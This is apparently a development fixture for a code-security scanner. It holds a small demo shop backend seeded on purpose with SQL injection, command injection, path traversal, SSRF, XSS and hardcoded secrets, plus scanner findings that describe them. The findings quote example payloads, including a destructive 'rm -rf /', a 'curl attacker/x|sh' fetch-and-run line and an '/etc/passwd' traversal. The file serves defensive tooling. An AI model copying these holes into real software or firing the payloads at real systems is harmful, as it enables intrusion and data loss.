import type {
  AppSettings,
  BlameInfo,
  CombineSpot,
  Confidence,
  Finding,
  FindingExtra,
  FindingSource,
  HistoryPoint,
  ScanReport,
  Severity,
  SeverityCounts,
} from "./types";

/**
 * A sample project for previewing the app outside Tauri.
 *
 * The real report only exists after a backend scan, so in a plain browser the
 * whole results surface would be invisible during frontend work. This fixture
 * — a small shop backend with a Flask API, an Express front end and a Go
 * service — is what the dev backend (devbackend.ts) "scans". It is shaped like
 * a real report on purpose: three traced data flows (one crossing files), a
 * flow and a pattern rule on the same line, repeated rules, vulnerable
 * packages with several advisories, BETA findings, a suppressed one and git
 * blame — every surface of the UI has something real to show.
 *
 * Titles and texts are the catalogue's own strings, so the English UI
 * translates them. Line numbers are looked up in the sources below rather
 * than written by hand, so the code viewer always points at the right line.
 *
 * Loaded only in development without Tauri; never part of a production build.
 */

// ------------------------------------------------------------------ sources

export const DEMO_SOURCES: Record<string, string> = {
  "app/orders.py": `from flask import Blueprint, request, jsonify
from .db import get_cursor
from .notify import notify_customer

bp = Blueprint("orders", __name__)


@bp.route("/orders")
def find_order():
    """Look an order up by id for the order-status page."""
    order_id = request.args.get("id")
    cursor = get_cursor()
    query = f"SELECT * FROM orders WHERE id = {order_id}"
    cursor.execute(query)
    row = cursor.fetchone()
    return jsonify(row)


@bp.route("/orders/<int:order_id>/cancel", methods=["POST"])
def cancel_order(order_id):
    cursor = get_cursor()
    cursor.execute("UPDATE orders SET status = 'cancelled' WHERE id = %s", (order_id,))
    try:
        notify_customer(order_id)
    except Exception:
        pass
    return jsonify(ok=True)
`,
  "app/main.py": `from flask import Flask
from .orders import bp as orders
from .config import SECRET_KEY

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.register_blueprint(orders)


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=8000,
        debug=True,
    )
`,
  "app/config.py": `import os

DATABASE_URL = os.environ.get("DATABASE_URL", "postgresql://localhost/shop")

# Signs session cookies and CSRF tokens.
SECRET_KEY = "dev-3f9a8c1e7b2d4a6f9e0c5b8d7a1f3e2c"
`,
  "app/tasks.py": `import logging
from .db import get_cursor

log = logging.getLogger(__name__)


def purge_expired_carts():
    cursor = get_cursor()
    try:
        cursor.execute("DELETE FROM carts WHERE expires_at < now()")
    except Exception:
        pass
`,
  "app/utils/cache.py": `import hashlib


def cache_key(*parts):
    raw = "|".join(str(p) for p in parts)
    return hashlib.md5(raw.encode()).hexdigest()
`,
  "app/utils/etag.py": `import hashlib


def etag(body: bytes) -> str:
    return '"' + hashlib.md5(body).hexdigest() + '"'
`,
  "app/auth/tokens.py": `import hashlib
import time


def reset_token(user_id: int) -> str:
    seed = f"{user_id}:{time.time()}"
    return hashlib.md5(seed.encode()).hexdigest()
`,
  "web/routes/convert.js": `const express = require("express");
const { convertImage } = require("../lib/images");

const router = express.Router();

// Thumbnail endpoint used by the gallery page.
router.get("/thumb", async (req, res) => {
  const name = req.query.file;
  const out = await convertImage(name);
  res.sendFile(out);
});

module.exports = router;
`,
  "web/lib/images.js": `const { exec } = require("child_process");
const path = require("path");

const OUT_DIR = path.join(__dirname, "..", "cache");

function convertImage(src) {
  const out = path.join(OUT_DIR, path.basename(src) + ".png");
  return new Promise((resolve, reject) => {
    exec("convert " + src + " -resize 320x320 " + out, (err) => {
      if (err) return reject(err);
      resolve(out);
    });
  });
}

module.exports = { convertImage };
`,
  "web/routes/files.js": `const express = require("express");
const path = require("path");

const router = express.Router();
const UPLOADS = path.join(__dirname, "..", "uploads");

router.get("/files/:name", (req, res) => {
  const name = req.params.name;
  res.sendFile(path.join(UPLOADS, name));
});

module.exports = router;
`,
  "web/server.js": `const express = require("express");
const crypto = require("crypto");

const app = express();
app.use("/api", require("./routes/convert"));
app.use("/api", require("./routes/files"));

app.post("/login", (req, res) => {
  const token = crypto.randomBytes(32).toString("hex");
  res.cookie("session", token);
  res.redirect("/");
});

app.listen(3000);
`,
  "web/public/profile.js": `export function renderProfile(el, user) {
  el.querySelector(".name").textContent = user.name;
  el.querySelector(".bio").innerHTML = user.bio;
}
`,
  "web/public/comments.js": `export function renderComment(list, comment) {
  const item = document.createElement("li");
  item.innerHTML = "<b>" + comment.author + "</b> " + comment.text;
  list.appendChild(item);
}
`,
  "web/public/search.js": `const params = new URLSearchParams(location.search);
const results = document.getElementById("results");
results.innerHTML = "Results for " + params.get("q");
`,
  "web/public/ui.js": `export function wobble(el) {
  el.style.transform = "rotate(" + (Math.random() * 4 - 2) + "deg)";
}
`,
  "web/package.json": `{
  "name": "shop-web",
  "version": "1.4.0",
  "private": true,
  "dependencies": {
    "express": "4.21.2",
    "lodash": "4.17.15",
    "jsonwebtoken": "8.5.1"
  }
}
`,
  "requirements.txt": `flask==3.0.3
psycopg2-binary==2.9.9
requests==2.25.0
`,
  "services/fetch/main.go": `package main

import (
	"io"
	"log"
	"net/http"
)

// preview fetches a page so the chat can show a link card.
func preview(w http.ResponseWriter, r *http.Request) {
	target := r.URL.Query().Get("url")
	resp, err := http.Get(target)
	if err != nil {
		http.Error(w, "fetch failed", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()
	io.Copy(w, io.LimitReader(resp.Body, 64<<10))
}

func main() {
	http.HandleFunc("/preview", preview)
	log.Fatal(http.ListenAndServe(":8081", nil))
}
`,
  "services/fetch/cache.go": `package main

import (
	"crypto/md5"
	"encoding/hex"
)

func cacheKey(url string) string {
	h := md5.New()
	h.Write([]byte(url))
	return hex.EncodeToString(h.Sum(nil))
}
`,
  "infra/main.tf": `resource "aws_db_instance" "orders" {
  identifier     = "orders-db"
  engine         = "postgres"
  instance_class = "db.t3.micro"
  username       = "orders"
  password       = "orders-pass-2024"
}
`,
  // Masked here the way the scanner masks it in every snippet and export.
  ".env": `DATABASE_URL=postgresql://localhost/shop
REDIS_URL=redis://localhost:6379
GITHUB_TOKEN=ghp_****************************
`,
  "scripts/deploy.py": `import os
import sys


def deploy(env):
    os.system("ansible-playbook deploy.yml -e target=" + sys.argv[1])


if __name__ == "__main__":
    deploy(os.environ.get("DEPLOY_ENV", "staging"))
`,
  "app/admin.py": `import os
import requests
from flask import request


def import_feed():
    url = request.args.get("url")
    data = requests.get(url).text
    os.system("feed-import --stdin <<< '" + data + "'")
`,
};

/** The 1-based line of `file` that contains `needle`. */
function lineOf(file: string, needle: string): number {
  const i = DEMO_SOURCES[file].split("\n").findIndex((l) => l.includes(needle));
  if (i < 0) throw new Error(`demo: "${needle}" not in ${file}`);
  return i + 1;
}

/** The trimmed text of a line, as a flow step or combination spot carries it. */
function codeAt(file: string, line: number): string {
  return DEMO_SOURCES[file].split("\n")[line - 1].trim();
}

/** Two lines of context either side, as the backend cuts snippets. */
function snippetAt(file: string, line: number): { snippet: string; snippetStartLine: number } {
  const lines = DEMO_SOURCES[file].split("\n");
  const start = Math.max(1, line - 2);
  const end = Math.min(lines.length, line + 2);
  return { snippet: lines.slice(start - 1, end).join("\n"), snippetStartLine: start };
}

// ----------------------------------------------------------------- findings

const PEOPLE: Record<string, Omit<BlameInfo, "date" | "commit">> = {
  maria: { author: "Мария Иванова", email: "maria@shop.example" },
  alex: { author: "alex.k", email: "alex@shop.example" },
  sam: { author: "Sam Porter", email: "sam@shop.example" },
};
function blame(who: keyof typeof PEOPLE, commit: string, date: string): BlameInfo {
  return { ...PEOPLE[who], commit, date };
}

interface Spec {
  ruleId: string;
  title: string;
  description: string;
  recommendation: string;
  severity: Severity;
  confidence?: Confidence;
  category: string;
  file: string;
  /** A substring of the flagged line. */
  at: string;
  cwe?: string[];
  owasp?: string | null;
  source?: FindingSource;
  sourceLabel?: string;
  isNew?: boolean;
  suppressed?: boolean;
  suppressionReason?: string | null;
  extra?: FindingExtra | null;
}

function finding(s: Spec): Finding {
  const line = lineOf(s.file, s.at);
  return {
    id: `${s.ruleId}:${s.file}:${line}`,
    fingerprint: `${s.ruleId}@${s.file}:${line}`,
    suppressed: s.suppressed ?? false,
    suppressionReason: s.suppressionReason ?? null,
    isNew: s.isNew ?? false,
    ruleId: s.ruleId,
    title: s.title,
    description: s.description,
    recommendation: s.recommendation,
    severity: s.severity,
    confidence: s.confidence ?? "high",
    source: s.source ?? "builtin",
    sourceLabel: s.sourceLabel ?? "Встроенные правила",
    category: s.category,
    file: s.file,
    line,
    endLine: line,
    column: 1,
    endColumn: 1,
    ...snippetAt(s.file, line),
    cwe: s.cwe ?? [],
    owasp: s.owasp ?? null,
    cve: [],
    references: [],
    extra: s.extra ?? null,
    package: null,
  };
}

const INJECTION = "A03:2021 – Injection";

/** A traced data flow, built like the backend builds one. */
function flow(opts: {
  category: string;
  cwe: string[];
  severity: Severity;
  entry: string;
  steps: { file: string; at: string; role: "source" | "prop" | "call" | "sink" }[];
  exploit: string;
  impact: string[];
  fixCode: string;
  isNew?: boolean;
  blame?: BlameInfo;
}): Finding {
  const home = opts.steps[0].file;
  const ROLE = {
    source: "Источник (пользовательский ввод)",
    prop: "Передача через переменную",
    call: "Передача в функцию",
    sink: "Приёмник (опасный вызов)",
  };
  const spots: CombineSpot[] = opts.steps.map((s) => {
    const line = lineOf(s.file, s.at);
    return { category: ROLE[s.role], line, code: codeAt(s.file, line), file: s.file === home ? null : s.file };
  });
  const crosses = spots.some((s) => s.file);
  // Anchored at the deepest step still in this file, as the scanner does.
  const anchor = [...opts.steps].reverse().find((s) => s.file === home)!;
  return {
    ...finding({
      ruleId: "VS-FLOW",
      title: crosses
        ? "Пользовательские данные достигают опасного вызова в другом файле"
        : "Пользовательские данные достигают опасного вызова",
      description: crosses
        ? "Анализ потока данных проследил значение от пользовательского ввода через вызов функции в другом файле до опасного вызова там — без экранирования или проверки по пути. Полный межфайловый путь показан в разделе «Поток данных»; каждый шаг, включая приёмник в другом файле, можно открыть в коде и проверить."
        : "Анализ потока данных проследил значение от места, где в программу попадает пользовательский ввод, через присваивания переменных до опасного вызова — без экранирования или проверки по пути. Полный путь показан в разделе «Поток данных»; каждый шаг можно открыть в коде и проверить.",
      recommendation:
        "Разорвите поток: примените параметризацию, экранирование или белый список на одном из шагов между источником и приёмником — лучше как можно ближе к приёмнику.",
      severity: opts.severity,
      confidence: "medium",
      sourceLabel: "Анализ потока данных",
      category: opts.category,
      file: home,
      at: anchor.at,
      cwe: opts.cwe,
      owasp: INJECTION,
      isNew: opts.isNew,
      extra: {
        exploit: opts.exploit,
        impact: opts.impact,
        fixCode: opts.fixCode,
        corroborated: false,
        flow: spots,
        entry: opts.entry,
        onDataPath: true,
        blame: opts.blame ?? null,
      },
    }),
  };
}

function extra(over: Partial<FindingExtra>): FindingExtra {
  return { exploit: null, impact: [], fixCode: null, corroborated: false, ...over };
}

const MD5_PY = {
  ruleId: "VS-PY-010",
  title: "Слабый хеш (MD5/SHA-1)",
  description: "MD5 и SHA-1 уязвимы к коллизиям и не годятся для подписей, проверки целостности и хранения паролей.",
  recommendation:
    "Для целостности берите hashlib.sha256. Для паролей — bcrypt, scrypt или argon2 (passlib/argon2-cffi), никогда не «сырой» хеш. Если хеш используется не для безопасности, добавьте usedforsecurity=False.",
  severity: "medium" as Severity,
  confidence: "medium" as Confidence,
  category: "Криптография",
  cwe: ["CWE-327"],
  owasp: "A02:2021 – Cryptographic Failures",
};

const XSS_JS = {
  ruleId: "VS-JS-004",
  title: "Присваивание в innerHTML / outerHTML",
  description: "innerHTML парсит строку как HTML. Пользовательские данные в ней приводят к XSS: скрипт исполнится в контексте вашего домена.",
  recommendation: "Используйте textContent для текста. Для HTML — DOMPurify.sanitize() или создание узлов через createElement.",
  severity: "high" as Severity,
  confidence: "medium" as Confidence,
  category: "XSS",
  cwe: ["CWE-79"],
  owasp: INJECTION,
};

const EMPTY_EXCEPT = {
  ruleId: "VS-PY-029",
  title: "Пустой except: исключение проглатывается",
  description:
    "except с одним pass гасит любую ошибку без следа. Если так подавлена проверка прав или валидация, сбой пройдёт незаметно, и код продолжит работу как ни в чём не бывало.",
  recommendation:
    "Ловите конкретный тип исключения и хотя бы логируйте его. Пустой except почти всегда прячет проблему, а не решает её.",
  severity: "low" as Severity,
  confidence: "medium" as Confidence,
  category: "Обработка ошибок",
  cwe: ["CWE-390"],
};

const SQL_ADVICE = {
  exploit:
    "Ввод «' OR '1'='1' -- » превращает условие в всегда-истинное и выдаёт все строки; «'; DROP TABLE users; --» разрушает данные.",
  impact: ["Чтение любых данных из базы", "Изменение или удаление данных", "Обход аутентификации"],
  fixCode: 'cursor.execute("SELECT * FROM users WHERE name = ?", (name,))  # parameterized, no string building',
};
const CMD_ADVICE = {
  exploit: "Ввод «; rm -rf / » или «$(curl attacker/x|sh)» выполняет произвольные команды ОС.",
  impact: ["Выполнение произвольных команд на сервере", "Полная компрометация хоста"],
  fixCode: 'subprocess.run(["ls", user_dir], shell=False)  # argv array, never a shell string',
};
const PATH_ADVICE = {
  exploit: "Ввод «../../../../etc/passwd» выходит за пределы каталога и читает системные файлы.",
  impact: ["Чтение произвольных файлов", "Раскрытие конфигов, ключей и исходников"],
  fixCode: "p = os.path.realpath(os.path.join(base, name))\nassert p.startswith(base + os.sep)  # stay inside base",
};
const SSRF_ADVICE = {
  exploit: "Ввод «http://169.254.169.254/latest/meta-data/» заставляет сервер обратиться к метаданным облака.",
  impact: ["Доступ к внутренним сервисам", "Кража облачных учётных данных", "Обход сетевого периметра"],
  fixCode: "host = urlparse(url).hostname\nassert host in ALLOWED_HOSTS  # allowlist; block private ranges",
};

/** One OSV advisory against a package, shaped like advisory_to_finding. */
function advisory(opts: {
  manifest: string;
  name: string;
  version: string;
  ecosystem: string;
  id: string;
  cve: string;
  severity: Severity;
  fixed: string;
  summary: string;
  cwe: string[];
  isNew?: boolean;
}): Finding {
  const line = lineOf(opts.manifest, opts.name);
  return {
    id: `osv:${opts.name}:${opts.version}:${opts.id}`,
    fingerprint: `osv:${opts.name}@${opts.version}:${opts.id}`,
    suppressed: false,
    suppressionReason: null,
    isNew: opts.isNew ?? false,
    ruleId: opts.id,
    title: `${opts.name} ${opts.version} — ${opts.cve}`,
    description: opts.summary,
    recommendation: `Обновите ${opts.name} с ${opts.version} до ${opts.fixed} или новее.`,
    severity: opts.severity,
    confidence: "high",
    source: "osv",
    sourceLabel: "OSV.dev",
    category: "Уязвимая зависимость",
    file: opts.manifest,
    line,
    endLine: line,
    column: 0,
    endColumn: 0,
    snippet: `${opts.name} ${opts.version}`,
    snippetStartLine: line,
    cwe: opts.cwe,
    owasp: "A06:2021 – Vulnerable and Outdated Components",
    cve: [opts.cve],
    references: [`https://osv.dev/vulnerability/${opts.id}`],
    extra: null,
    package: { name: opts.name, version: opts.version, ecosystem: opts.ecosystem, fixedVersion: opts.fixed },
  };
}

const findings: Finding[] = [
  // --- traced data flows -------------------------------------------------
  flow({
    category: "SQL-инъекция",
    cwe: ["CWE-89"],
    severity: "critical",
    entry: "HTTP-запрос",
    steps: [
      { file: "app/orders.py", at: 'order_id = request.args.get("id")', role: "source" },
      { file: "app/orders.py", at: "query = f", role: "prop" },
      { file: "app/orders.py", at: "cursor.execute(query)", role: "sink" },
    ],
    ...SQL_ADVICE,
    blame: blame("maria", "4e1c9a2", "2026-08-14"),
  }),
  flow({
    category: "Инъекция команд",
    cwe: ["CWE-78"],
    severity: "critical",
    entry: "HTTP-запрос",
    steps: [
      { file: "web/routes/convert.js", at: "const name = req.query.file", role: "source" },
      { file: "web/routes/convert.js", at: "convertImage(name)", role: "call" },
      { file: "web/lib/images.js", at: 'exec("convert "', role: "sink" },
    ],
    ...CMD_ADVICE,
    blame: blame("alex", "b07d311", "2026-09-02"),
  }),
  flow({
    category: "Path traversal",
    cwe: ["CWE-22"],
    severity: "high",
    entry: "HTTP-запрос",
    steps: [
      { file: "web/routes/files.js", at: "const name = req.params.name", role: "source" },
      { file: "web/routes/files.js", at: "res.sendFile(path.join(UPLOADS, name))", role: "sink" },
    ],
    ...PATH_ADVICE,
    isNew: true,
    blame: blame("alex", "c3f8e90", "2026-10-19"),
  }),
  flow({
    category: "SSRF",
    cwe: ["CWE-918"],
    severity: "high",
    entry: "HTTP-запрос",
    steps: [
      { file: "services/fetch/main.go", at: 'target := r.URL.Query().Get("url")', role: "source" },
      { file: "services/fetch/main.go", at: "http.Get(target)", role: "sink" },
    ],
    ...SSRF_ADVICE,
    isNew: true,
    blame: blame("sam", "91aa04d", "2026-10-20"),
  }),

  // --- pattern rules on those flows ---------------------------------------
  finding({
    ruleId: "VS-PY-008",
    title: "SQL-запрос собирается f-строкой",
    description:
      "Подстановка значений в текст SQL через f-строку не экранирует кавычки и спецсимволы. Пользовательский ввод может изменить структуру запроса — это SQL-инъекция.",
    recommendation:
      'Используйте параметризованные запросы: cursor.execute("SELECT * FROM t WHERE id = %s", (user_id,)). Драйвер сам выполнит экранирование.',
    severity: "critical",
    category: "SQL-инъекция",
    file: "app/orders.py",
    at: "query = f",
    cwe: ["CWE-89"],
    owasp: INJECTION,
    extra: extra({ onDataPath: true, blame: blame("maria", "4e1c9a2", "2026-08-14") }),
  }),
  finding({
    ruleId: "VS-JS-007",
    title: "child_process.exec() — команда через шелл",
    description:
      "exec() передаёт строку системному шеллу целиком. Пользовательские данные в команде дают инъекцию: `; rm -rf /` отработает.",
    recommendation:
      'Используйте execFile() или spawn() с массивом аргументов — они не запускают шелл: execFile("git", ["log", branch]).',
    severity: "high",
    category: "Инъекция команд",
    file: "web/lib/images.js",
    at: 'exec("convert "',
    cwe: ["CWE-78"],
    owasp: INJECTION,
    extra: extra({ onDataPath: true, blame: blame("alex", "b07d311", "2026-09-02") }),
  }),
  finding({
    ruleId: "VS-JS-021",
    title: "Path traversal: путь из пользовательских данных",
    description:
      "Склейка пути с данными запроса позволяет выйти за пределы каталога через ../ и прочитать произвольные файлы.",
    recommendation:
      "Нормализуйте путь через path.resolve() и проверьте, что результат начинается с разрешённого каталога. Лучше — path.basename() для имени файла.",
    severity: "high",
    confidence: "medium",
    category: "Path traversal",
    file: "web/routes/files.js",
    at: "res.sendFile(path.join(UPLOADS, name))",
    cwe: ["CWE-22"],
    owasp: "A01:2021 – Broken Access Control",
    isNew: true,
    extra: extra({ onDataPath: true }),
  }),

  // --- secrets ------------------------------------------------------------
  finding({
    ruleId: "VS-SEC-003",
    title: "GitHub Personal Access Token",
    description:
      "Токен GitHub даёт доступ к репозиториям владельца в объёме своих scope: чтение приватного кода, пуш, а иногда управление организацией.",
    recommendation:
      "Отзовите токен в Settings → Developer settings → Personal access tokens. Для CI используйте GITHUB_TOKEN или GitHub App с минимальными правами.",
    severity: "critical",
    source: "secrets",
    sourceLabel: "Поиск секретов",
    category: "Секрет в коде",
    file: ".env",
    at: "GITHUB_TOKEN",
    cwe: ["CWE-798"],
    isNew: true,
  }),
  finding({
    ruleId: "VS-PY-032",
    title: "SECRET_KEY зашит в код",
    description:
      "Строковый литерал в SECRET_KEY (Django/Flask) — это ключ подписи сессий и CSRF-токенов прямо в исходнике. Зная его, атакующий подделает сессию и войдёт кем угодно.",
    recommendation:
      'Читайте SECRET_KEY из окружения или хранилища секретов (os.environ["SECRET_KEY"]). Утёкший ключ смените.',
    severity: "high",
    confidence: "medium",
    category: "Хранение секретов",
    file: "app/config.py",
    at: "SECRET_KEY =",
    cwe: ["CWE-798"],
    extra: extra({ blame: blame("maria", "0a51d77", "2026-03-11") }),
  }),
  finding({
    ruleId: "VS-TF-004",
    title: "Секрет в открытом виде в конфигурации",
    description:
      "Пароли и ключи в .tf попадают в репозиторий и в state-файл. Terraform state хранит их без шифрования.",
    recommendation:
      "Используйте переменные с sensitive = true и подставляйте значения из Vault, AWS Secrets Manager или переменных окружения.",
    severity: "high",
    confidence: "low",
    category: "Секрет в коде",
    file: "infra/main.tf",
    at: "password",
    cwe: ["CWE-798"],
  }),

  // --- repeated rules -------------------------------------------------------
  ...[
    ["web/public/profile.js", ".bio\").innerHTML"],
    ["web/public/comments.js", "item.innerHTML"],
    ["web/public/search.js", "results.innerHTML"],
  ].map(([file, at]) => finding({ ...XSS_JS, file, at })),
  ...[
    ["app/utils/cache.py", "hashlib.md5"],
    ["app/utils/etag.py", "hashlib.md5"],
    ["app/auth/tokens.py", "hashlib.md5"],
  ].map(([file, at]) => finding({ ...MD5_PY, file, at })),
  finding({
    ruleId: "VS-GO-004",
    title: "Слабый хеш (MD5/SHA-1)",
    description: "MD5 и SHA-1 уязвимы к коллизиям и не годятся для подписей и проверки целостности.",
    recommendation: "Используйте sha256.New(). Для паролей — golang.org/x/crypto/bcrypt или argon2.",
    severity: "medium",
    confidence: "medium",
    category: "Криптография",
    file: "services/fetch/cache.go",
    at: "md5.New()",
    cwe: ["CWE-327"],
  }),

  // --- configuration and hygiene -------------------------------------------
  finding({
    ruleId: "VS-PY-013",
    title: "Flask запущен с debug=True",
    description:
      "Debug-режим Flask включает интерактивную консоль Werkzeug. На доступном извне хосте это прямое выполнение кода без аутентификации.",
    recommendation:
      "Никогда не включайте debug в продакшене. Управляйте флагом через переменную окружения и по умолчанию держите его выключенным.",
    severity: "high",
    category: "Конфигурация",
    file: "app/main.py",
    at: "debug=True",
    cwe: ["CWE-489"],
    owasp: "A05:2021 – Security Misconfiguration",
  }),
  finding({
    ruleId: "VS-PY-020",
    title: "Привязка сервера ко всем интерфейсам",
    description:
      "0.0.0.0 открывает порт на всех сетевых интерфейсах, включая внешние. Часто это делают для отладки и забывают вернуть обратно.",
    recommendation:
      "Слушайте 127.0.0.1, если сервис нужен только локально. Наружу публикуйте через reverse-proxy с TLS и аутентификацией.",
    severity: "low",
    confidence: "low",
    category: "Конфигурация",
    file: "app/main.py",
    at: 'host="0.0.0.0"',
    cwe: ["CWE-605"],
  }),
  finding({
    ruleId: "VS-JS-025",
    title: "Cookie без флагов httpOnly / secure",
    description:
      "Без httpOnly cookie читается скриптом при XSS, без secure — уходит по открытому HTTP и перехватывается в сети.",
    recommendation: 'Ставьте { httpOnly: true, secure: true, sameSite: "strict" } для всех сессионных cookie.',
    severity: "medium",
    confidence: "low",
    category: "Конфигурация",
    file: "web/server.js",
    at: "res.cookie(",
    cwe: ["CWE-614"],
  }),
  finding({ ...EMPTY_EXCEPT, file: "app/orders.py", at: "except Exception:" }),
  finding({ ...EMPTY_EXCEPT, file: "app/tasks.py", at: "except Exception:" }),

  // --- dependencies ---------------------------------------------------------
  advisory({
    manifest: "web/package.json",
    name: "lodash",
    version: "4.17.15",
    ecosystem: "npm",
    id: "GHSA-35jh-r3h4-6jhm",
    cve: "CVE-2021-23337",
    severity: "high",
    fixed: "4.17.21",
    summary: "Command Injection in lodash: the template function lets an attacker run code through the variable option.",
    cwe: ["CWE-77", "CWE-94"],
  }),
  advisory({
    manifest: "web/package.json",
    name: "lodash",
    version: "4.17.15",
    ecosystem: "npm",
    id: "GHSA-p6mc-m468-83gw",
    cve: "CVE-2020-8203",
    severity: "high",
    fixed: "4.17.19",
    summary: "Prototype Pollution in lodash via zipObjectDeep.",
    cwe: ["CWE-770", "CWE-1321"],
  }),
  advisory({
    manifest: "web/package.json",
    name: "jsonwebtoken",
    version: "8.5.1",
    ecosystem: "npm",
    id: "GHSA-hjrf-2m68-5959",
    cve: "CVE-2022-23541",
    severity: "medium",
    fixed: "9.0.0",
    summary: "jsonwebtoken's insecure implementation of key retrieval function could lead to forgeable public/private tokens.",
    cwe: ["CWE-287"],
  }),
  advisory({
    manifest: "requirements.txt",
    name: "requests",
    version: "2.25.0",
    ecosystem: "PyPI",
    id: "GHSA-j8r2-6x86-q33q",
    cve: "CVE-2023-32681",
    severity: "medium",
    fixed: "2.31.0",
    summary: "Unintended leak of Proxy-Authorization header in requests.",
    cwe: ["CWE-200"],
    isNew: true,
  }),

  // --- suppressed -------------------------------------------------------------
  finding({
    ruleId: "VS-JS-015",
    title: "Math.random() для токена или идентификатора сессии",
    description:
      "Math.random() не криптостойкий: состояние генератора восстанавливается по нескольким значениям, а значит токены предсказуемы.",
    recommendation: "В браузере — crypto.getRandomValues(new Uint8Array(32)). В Node — crypto.randomBytes(32) или crypto.randomUUID().",
    severity: "medium",
    confidence: "low",
    category: "Криптография",
    file: "web/public/ui.js",
    at: "Math.random()",
    cwe: ["CWE-338"],
    suppressed: true,
    suppressionReason: "Анимация, не безопасность",
  }),

  // --- BETA ---------------------------------------------------------------------
  finding({
    ruleId: "VS-EXP-001",
    title: "Возможная инъекция команд",
    description:
      "В одной строке встречаются пользовательский ввод и запуск системной команды. Если ввод попадает в команду без экранирования, это инъекция команд ОС. Это эвристика (BETA): точное правило здесь не сработало, проверьте поток данных вручную.",
    recommendation:
      "Убедитесь, что ввод не попадает в команду. Запускайте процессы с массивом аргументов без шелла и с белым списком.",
    severity: "medium",
    confidence: "low",
    category: "Инъекция команд",
    file: "scripts/deploy.py",
    at: "os.system(",
    cwe: ["CWE-78"],
    extra: extra({ experimental: true }),
  }),
  (() => {
    const file = "app/admin.py";
    const ssrf = lineOf(file, "requests.get(url)");
    const cmd = lineOf(file, "os.system(");
    return finding({
      ruleId: "VS-EXP-COMBO",
      title: "Возможная цепочка: SSRF → выполнение команд ОС",
      description:
        "В этом файле пересекаются несколько потенциально опасных векторов (перечислены в «Связанных местах»). По отдельности каждый требует ручной проверки, но вместе они образуют вероятную цепочку эксплуатации: управляемые данные достигают одного вектора, а через другой усиливаются до выполнения кода или утечки. Это эвристическая связка (BETA): проверьте, связаны ли эти места одним потоком данных.",
      recommendation:
        "Разберите поток данных между перечисленными местами. Устраните хотя бы одно звено цепочки (параметризация, экранирование, белые списки), а лучше — каждое.",
      severity: "critical",
      confidence: "low",
      category: "Опасная связка",
      file,
      at: "requests.get(url)",
      cwe: ["CWE-77", "CWE-78", "CWE-918"],
      owasp: INJECTION,
      extra: extra({
        experimental: true,
        combination: true,
        combineSpots: [
          { category: "SSRF", line: ssrf, code: codeAt(file, ssrf) },
          { category: "Инъекция команд", line: cmd, code: codeAt(file, cmd) },
        ],
      }),
    });
  })(),
];

// --------------------------------------------------------------- the report

const LANG: Record<string, [string, string]> = {
  py: ["python", "Python"],
  js: ["javascript", "JavaScript"],
  go: ["go", "Go"],
  tf: ["terraform", "Terraform"],
  json: ["json", "JSON"],
  txt: ["other", "Text"],
  env: ["env", "Env"],
};
const ZERO = (): SeverityCounts => ({ critical: 0, high: 0, medium: 0, low: 0, info: 0 });
const ORDER: Severity[] = ["critical", "high", "medium", "low", "info"];

/** Per-file and total counts over what needs attention, as the scanner tallies. */
function tally() {
  const counts = ZERO();
  const perFile = new Map<string, SeverityCounts>();
  for (const f of findings) {
    if (f.suppressed) continue;
    counts[f.severity]++;
    const c = perFile.get(f.file) ?? ZERO();
    c[f.severity]++;
    perFile.set(f.file, c);
  }
  const files = Object.keys(DEMO_SOURCES).map((path) => {
    const ext = path === ".env" ? "env" : (path.split(".").pop() ?? "txt");
    const [language, languageLabel] = LANG[ext] ?? LANG.txt;
    const c = perFile.get(path) ?? ZERO();
    const text = DEMO_SOURCES[path];
    return {
      path,
      language,
      languageLabel,
      size: text.length,
      lines: text.split("\n").length,
      counts: c,
      maxSeverity: ORDER.find((s) => c[s] > 0) ?? null,
    };
  });
  return { counts, files };
}

/** A fresh report, stamped now — the dev backend returns one per "scan". */
export function demoReport(durationMs = 4200): ScanReport {
  const { counts, files } = tally();
  const now = Date.now();
  return {
    id: `demo-${now}`,
    root: "D:/Projects/shop",
    targetLabel: "shop",
    startedAt: new Date(now - durationMs).toISOString(),
    finishedAt: new Date(now).toISOString(),
    durationMs,
    cancelled: false,
    delta: {
      previousScanAt: new Date(now - 86_400_000).toISOString(),
      newCount: findings.filter((f) => f.isNew && !f.suppressed && !f.extra?.experimental).length,
      fixedCount: 2,
      unchangedCount: findings.filter((f) => !f.isNew && !f.suppressed && !f.extra?.experimental).length,
      fixed: [
        { fingerprint: "old-1", ruleId: "VS-PY-001", title: "Вызов eval() с динамическими данными", file: "app/legacy.py", severity: "critical" },
        { fingerprint: "old-2", ruleId: "VS-JS-014", title: "jwt.decode() вместо jwt.verify()", file: "web/auth.js", severity: "high" },
      ],
      newBySeverity: { critical: 1, high: 2, medium: 1 },
    },
    suppressedCount: findings.filter((f) => f.suppressed).length,
    findings: findings.map((f) => ({ ...f })),
    files,
    skipped: [
      { path: "web/node_modules/express/index.js", reason: "vendor", reasonLabel: "Вендор-директория", size: 4200 },
      { path: "web/public/img/logo.png", reason: "binary", reasonLabel: "Бинарный файл", size: 88_000 },
      { path: "web/public/vendor/chart.min.js", reason: "minified", reasonLabel: "Минифицированный файл", size: 205_000 },
    ],
    counts,
    filesScanned: 214,
    filesSkipped: 1320,
    linesScanned: 41_230,
    bytesScanned: 1_320_000,
    languages: [
      { language: "python", label: "Python", files: 96, lines: 18_400 },
      { language: "javascript", label: "JavaScript", files: 74, lines: 15_200 },
      { language: "go", label: "Go", files: 28, lines: 5_400 },
      { language: "terraform", label: "Terraform", files: 16, lines: 2_230 },
    ],
    dependenciesChecked: 312,
    enginesUsed: ["Встроенные правила", "Анализ потока данных", "Поиск секретов", "OSV.dev"],
    warnings: [],
  };
}

/** Ten earlier scans of the same project: a long climb down, one bad week. */
export function demoHistory(): HistoryPoint[] {
  const totals = [38, 41, 36, 33, 35, 30, 27, 29, 26, 24];
  const day = 86_400_000;
  return totals.map((total, i) => {
    const critical = Math.max(2, Math.round(total * 0.12));
    const high = Math.round(total * 0.3);
    const medium = Math.round(total * 0.3);
    const low = total - critical - high - medium;
    return {
      scannedAt: new Date(Date.now() - (totals.length - i) * 3 * day).toISOString(),
      total,
      critical,
      high,
      medium,
      low,
      info: 0,
      reachable: Math.max(3, Math.round(total * 0.2)),
    };
  });
}

/**
 * Settings for the same preview. Mirrors the backend defaults, with an editor
 * command so the open-in-editor button shows.
 */
export const DEMO_SETTINGS: AppSettings = {
  maxFileSizeMb: 2,
